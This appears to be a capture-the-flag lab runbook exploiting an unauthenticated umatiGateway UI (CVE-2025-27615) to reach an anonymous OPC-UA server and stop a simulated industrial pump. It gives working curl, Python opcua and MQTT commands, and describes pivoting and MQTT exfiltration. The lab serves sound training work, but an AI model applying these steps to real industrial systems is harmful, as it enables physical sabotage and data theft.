# Runbook: umatiGateway config theft and pump sabotage

Two steps from the internet to a method call that stops an industrial pump.
The umatiGateway management UI exposes the configured OPC-UA endpoint without
any authentication. The OPC-UA server accepts anonymous connections with
SecurityMode None. The pump's stop method requires neither credentials nor
elevated access. This is what CVE-2025-27615 looks like in an OT context.

- Techniques: 
  - [Trust exploitation and misconfiguration](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#trust-exploitation-and-misconfiguration-abuse)
  - [Process intelligence gathering](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#process-intelligence-gathering)
  - [Unauthorised state manipulation](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#unauthorised-state-manipulation)
- Challenge type: Realist
- Difficulty: Intermediate

## Components to start

```bash
./ctl up
```

Minimal containers: `guild-exchange`, `guild-register`

Add `clacks-relay` to observe MQTT northbound output after the OPC connection is
activated. `unseen-gate` is the intended attack host but any host on the internet zone
or DMZ with a route to 10.10.5.10 works.

Entry point: any host on the internet zone or the DMZ. `unseen-gate`
(10.10.0.5) has a direct route to `guild-exchange` (10.10.5.10:8080).

## Background

`guild-exchange` runs umatiGateway (pre-fix build, `ghcr.io/umati/umatigateway:pr-375`).
The web management UI on port 8080 requires no authentication. This is
CVE-2025-27615: any caller can read the gateway configuration, modify it, or
trigger OPC connections without providing credentials.

The gateway is pre-configured with an OPC-UA connection to `guild-register`
(10.10.5.13:4840), SecurityMode None, anonymous authentication. The OPC-UA
server is a thin-edge demo server simulating an industrial pump with callable
methods including `stopPump()`. No access control applies to method calls; any
client that reaches port 4840 can stop the pump.

## Attack path

### Stage 1: enumerate the gateway without credentials

```bash
# Confirm the management UI is open (CVE-2025-27615)
curl -I http://10.10.5.10:8080/
# HTTP/1.1 200 OK, no WWW-Authenticate header

# Browse to /OPCConnection for the configured server list
curl -s http://10.10.5.10:8080/OPCConnection
# Returns the OPC-UA endpoint: opc.tcp://10.10.5.13:4840
# Status: Idle (not yet connected)
```

### Stage 2: trigger the OPC connection via the UI

```bash
# The "Connect" button in the management UI triggers the OPC connection
# Replicating that via the REST API (exact endpoint from the umatiGateway docs):
curl -s -X POST http://10.10.5.10:8080/OPCConnection/connect \
  -H 'Content-Type: application/json' \
  -d '{"serverEndpoint":"opc.tcp://10.10.5.13:4840"}'
# Once connected, the gateway browses the node tree and publishes values to
# clacks-relay:1883 (also pre-configured, anonymous)

# Alternatively: skip the gateway and attack guild-register directly
```

### Stage 3: connect to the OPC-UA server anonymously

```python
# From unseen-gate, using the Python opcua library
from opcua import Client

c = Client("opc.tcp://10.10.5.13:4840")
c.connect()

# Browse the object tree to find the pump node
root = c.get_root_node()
objects = c.get_objects_node()
print(objects.get_children())
# [Node(NodeId(ns=2;i=1)), ...]  inspect names to find the pump object
```

### Stage 4: read pump state and call stopPump

```python
# Identify the pump node (browse by name or display name)
pump = objects.get_child(["2:DeviceSet", "2:Pump"])
# Or iterate children and match display names

# Read current status
status = pump.get_child("2:PumpState").get_value()
print(status)
# True (running)

# Call the stop method
result = pump.call_method("2:stopPump")
print(result)
# Method executed: pump status transitions to False (stopped)

# Verify
status = pump.get_child("2:PumpState").get_value()
print(status)
# False
```

### Stage 5: observe MQTT northbound data

```bash
# The gateway publishes values from the OPC node tree to clacks-relay
# Subscribe from unseen-gate to see what the gateway exposes
mosquitto_sub -h 10.10.5.12 -p 1883 -t '#' -v
# umatigateway/guild-exchange/PumpState   false
# umatigateway/guild-exchange/FlowRate    0
# ...
```

## Flag placement

Place the flag as a readable OPC-UA variable on the pump object. After calling
`stopPump()`, a new variable `FaultCode` becomes readable with value `RM{...}`.
Implement this in the thin-edge demo server config or as a static node that
activates after the method call.

Alternatively, have the `stopPump()` method return the flag string as its
return value. The participant calls the method and reads it from the response.

## One step further

The gateway can be reconfigured via the unauthenticated UI to point at any
OPC-UA endpoint reachable from the DMZ. Any OPC-UA server deployed without
authentication becomes reachable through this pivot, including servers that
operators may have assumed were isolated from the internet.

The MQTT northbound output is also configurable without credentials. Redirecting
it to an attacker-controlled broker turns the gateway into a data exfiltration
pipeline for whatever OPC nodes it is connected to.
